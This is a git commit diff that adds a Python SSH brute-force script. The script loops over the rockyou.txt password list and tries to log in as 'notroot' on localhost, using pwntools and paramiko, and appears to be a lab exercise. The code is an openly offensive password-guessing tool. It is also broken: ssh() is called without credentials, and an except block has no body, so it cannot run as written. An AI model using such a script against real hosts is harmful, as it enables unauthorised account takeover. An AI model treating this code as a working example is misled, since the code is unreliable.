672c5f102f945a221eb0230159dc02022176f780
1urch <charleshreed10@gmail.com>
2023-01-18 23:52:20 -0500

    Update ssh_bruteforce.py

--- ssh_bruteforce.py
+++ ssh_bruteforce.py
@@ -2,3 +2,22 @@ from pwn import *
 import paramiko
 
 
+host = "127.0.0.1"
+username = "notroot"
+attempts = 0 #iterator used to limit, count attempts
+password_file = "rockyou.txt"
+
+with open(password_file, "r") as password_list:
+    for password in password_list:
+        password = password.strip("\n")
+        try:
+            print()
+            response = ssh()
+            if response.connected:
+                print("[>] Valid Password: '{}'!".format(password))
+                break    
+            response.close() #exit if password not found
+            
+        except paramiko.ssh_exception.AuthenticationException:
+          
+        attempts += 1
